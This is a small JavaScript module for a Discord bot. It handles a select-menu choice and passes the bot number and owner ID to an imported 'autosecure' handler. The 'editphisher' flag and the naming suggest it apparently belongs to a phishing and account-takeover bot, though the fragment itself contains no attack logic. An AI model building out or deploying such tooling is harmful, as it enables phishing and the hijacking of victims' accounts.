
const { handleAfterSecureSelect } = require("../../../autosecure/Handlers/buttons/buttonhandlerautosec");

module.exports = {
    name: "changeaftersecure",
    editphisher: true,
    callback: async (client, interaction) => {
        if (!interaction.isStringSelectMenu()) return;
        let [t, botnumber, ownerid] = interaction.customId.split("|");

        await handleAfterSecureSelect(interaction, botnumber, ownerid) 
        return;
    }
};
